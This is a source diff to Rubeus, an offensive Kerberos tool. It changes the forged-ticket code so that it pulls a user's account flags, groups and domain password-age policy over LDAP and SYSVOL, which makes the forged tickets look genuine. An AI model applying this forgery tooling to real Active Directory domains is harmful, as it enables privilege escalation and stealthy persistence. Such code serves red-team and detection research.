@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Globalization;
 using System.DirectoryServices;
+using System.Text.RegularExpressions;
 using Rubeus.lib.Interop;
 using Rubeus.Kerberos.PAC;
 using Rubeus.Kerberos;
@@ -24,7 +25,8 @@ namespace Rubeus
             Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256,
             // ldap information
             bool ldap = false,
-            System.Net.NetworkCredential ldapcred = null,
+            string ldapuser = null,
+            string ldappassword = null,
             // domain and DC information
             string sid = "",
             string domain = "",
@@ -49,6 +51,8 @@ namespace Rubeus
             DateTime? lastLogon = null,
             DateTime? lastLogOff = null,
             DateTime? pwdLastSet = null,
+            int? maxPassAge = null,
+            int? minPassAge = null,
             int? pGid = null,
             string homeDir = "",
             string homeDrive = "",
@@ -64,6 +68,9 @@ namespace Rubeus
             // vars
             int c = 0;
             DateTime originalStartTime = (DateTime)startTime;
+            System.Net.NetworkCredential ldapCred = null;
+            int? origMinPassAge = minPassAge;
+            int? origMaxPassAge = maxPassAge;
 
             // initialise LogonInfo section and set defaults
             var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
@@ -95,13 +102,38 @@ namespace Rubeus
                     new Ndr._GROUP_MEMBERSHIP(518, 0),
                 };
             }
-            kvi.UserAccountControl = 528;
+            kvi.UserAccountControl = 512;
             kvi.UserFlags = 32;
             if (String.IsNullOrEmpty(sids))
             {
                 kvi.SidCount = 1;
                 kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
                         new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
+            }
+
+            // get network crednetial from ldapuser and ldappassword
+            if (!String.IsNullOrEmpty(ldapuser))
+            {
+                // provide an alternate user to use for connection creds
+                if (!Regex.IsMatch(ldapuser, ".+\\.+", RegexOptions.IgnoreCase))
+                {
+                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
+                    return;
+                }
+
+                try
+                {
+                    string[] ldapParts = ldapuser.Split('\\');
+                    string ldapDomainName = ldapParts[0];
+                    string ldapUserName = ldapParts[1];
+
+                    ldapCred = new System.Net.NetworkCredential(ldapUserName, ldappassword, ldapDomainName);
+                }
+                catch
+                {
+                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
+                    return;
+                }
             }
 
 
@@ -155,12 +187,12 @@ namespace Rubeus
                 }
 
                 Console.WriteLine("[*] Trying to query LDAP using LDAPS on domain controller {0}", domainController);
-                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapcred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
                 if (ActiveDirectoryObjects == null)
                 {
                     Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
                     ssl = false;
-                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapcred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
                 }
                 if (ActiveDirectoryObjects == null)
                 {
@@ -174,60 +206,205 @@ namespace Rubeus
                     string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
                     string configOU = String.Format("CN=Configuration,DC={0}", domain.Replace(".", ",DC="));
 
+                    // parse the UAC field and set in the PAC
+                    kvi.UserAccountControl = 0;
+                    Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];
+                    if ((userUAC & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
+                    }
+
+                    if ((userUAC & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
+                    }
+                    // Is this right? LDAP UAC field doesn't contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate
+                    if ((userUAC & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NOT_DELEGATED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
+                    }
+                    /* No NO_AUTH_DATA_REQUIRED bit seems to exist in the UAC field returned by LDAP
+                    if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
+                    }*/
+                    if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
+                    }
+                    /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
+                    if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
+                    }*/
+
                     List<IDictionary<string, Object>> adObjects = null;
 
+                    // build group and domain policy filter
+                    string filter = "";
+                    string outputText = "";
                     if (string.IsNullOrEmpty(groups))
                     {
-                        // Try to get group information from LDAP
-                        Console.WriteLine("[*] Retrieving group information over LDAP from domain controller {0}", domainController);
-                        string groupFilter = "";
                         if (userObject.ContainsKey("memberof"))
                         {
                             foreach (string groupDN in (string[])userObject["memberof"])
                             {
-                                groupFilter += String.Format("(distinguishedname={0})", groupDN);
+                                filter += String.Format("(distinguishedname={0})", groupDN);
                             }
-                            adObjects = Networking.GetLdapQuery(ldapcred, "", domainController, domain, String.Format("(|{0})", groupFilter), ssl);
-                            if (adObjects == null)
+                            outputText += "group";
+                        }
+                    }
+                    if (minPassAge == null || (maxPassAge == null && ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
+                    {
+                        filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);
+                        if (String.IsNullOrEmpty(outputText))
+                        {
+                            outputText = "domain policy";
+                        }
+                        else
+                        {
+                            outputText = String.Format("{0} and domain policy", outputText);
+                        }
+                    }
+
+                    if (!String.IsNullOrEmpty(filter))
+                    {
+                        // Try to get group and domain policy information from LDAP
+                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {0}", outputText, domainController);
+                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);
+                        if (adObjects == null)
+                        {
+                            Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
+                        }
+                        else
+                        {
+                            if (userObject.ContainsKey("memberof"))
                             {
-                                Console.WriteLine("[!] Unable to get group information using LDAP, using defaults.");
+                                kvi.GroupCount = ((string[])userObject["memberof"]).Length;
+                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[((string[])userObject["memberof"]).Length];
                             }
                             else
                             {
-                                kvi.GroupCount = adObjects.Count;
-                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[adObjects.Count];
-                                c = 0;
-                                foreach (var groupObject in adObjects)
+                                kvi.GroupCount = 0;
+                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[0];
+                            }
+                            c = 0;
+                            foreach (var o in adObjects)
+                            {
+                                if (o.ContainsKey("gpcfilesyspath"))
                                 {
-                                    string groupSid = (string)groupObject["objectsid"];
+                                    string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
+                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);
+
+                                    if (minPassAge == null)
+                                    {
+                                        minPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MinimumPasswordAge"]);
+                                        if (minPassAge > 0)
+                                        {
+                                            kvi.PasswordCanChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)minPassAge));
+                                        }
+                                    }
+                                    if (maxPassAge == null && ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
+                                    {
+                                        maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);
+                                        if (maxPassAge > 0)
+                                        {
+                                            kvi.PasswordMustChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)maxPassAge));
+                                        }
+                                    }
+                                }
+                                else
+                                {
+                                    string groupSid = (string)o["objectsid"];
                                     int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
                                     Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);
                                     c += 1;
                                 }
                             }
                         }
-                        else
-                        {
-                            kvi.GroupCount = 0;
-                            kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[0];
-                        }
                     }
 
+                    // preform the netbios name lookup
                     if (String.IsNullOrEmpty(netbiosName))
                     {
-                        // Try to get netbios name from LDAP
-                        Console.WriteLine("[*] Retrieving netbios name over LDAP from domain controller {0}", domainController);
-                        adObjects = Networking.GetLdapQuery(ldapcred, configOU, domainController, domain, "(netbiosname=*)", ssl);
+                        Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);
+                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, "(netbiosname=*)", ssl);
                         if (adObjects == null)
                         {
-                            Console.WriteLine("[!] Unable to get netbios name using LDAP, using defaults.");
+                            Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
                         }
                         else
                         {
-                            foreach (var n in adObjects)
+                            foreach (var o in adObjects)
                             {
-                                Console.WriteLine("TESTING: {0}", (string)n["netbiosname"]);
-                                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)n["netbiosname"]);
+                                if (o.ContainsKey("netbiosname"))
+                                {
+                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)o["netbiosname"]);
+                                }
                             }
                         }
                     }
@@ -361,6 +538,36 @@ namespace Rubeus
             if (pwdLastSet != null)
             {
                 kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)pwdLastSet);
+            }
+            if (origMinPassAge != null)
+            {
+                try
+                {
+                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
+                    if (minPassAge > 0)
+                    {
+                        kvi.PasswordCanChange = new Ndr._FILETIME(passLastSet.AddDays((double)minPassAge));
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Something went wrong setting the PasswordCanChange field, perhaps PasswordLastSet is not configured properly");
+                }
+            }
+            if (origMaxPassAge != null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
+            {
+                try
+                {
+                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
+                    if (maxPassAge > 0)
+                    {
+                        kvi.PasswordMustChange = new Ndr._FILETIME(passLastSet.AddDays((double)maxPassAge));
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Something went wrong setting the PasswordMustChange field, perhaps PasswordLastSet is not configured properly");
+                }
             }
             if (id != null)
             {
@@ -702,6 +909,14 @@ namespace Rubeus
                     cmdOut = String.Format("{0} /pwdlastset:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
                 }
                 catch { }
+                if (minPassAge != null && minPassAge > 0)
+                {
+                    cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);
+                }
+                if (maxPassAge != null && maxPassAge > 0)
+                {
+                    cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);
+                }
                 if (kvi.BadPasswordCount > 0)
                 {
                     cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);
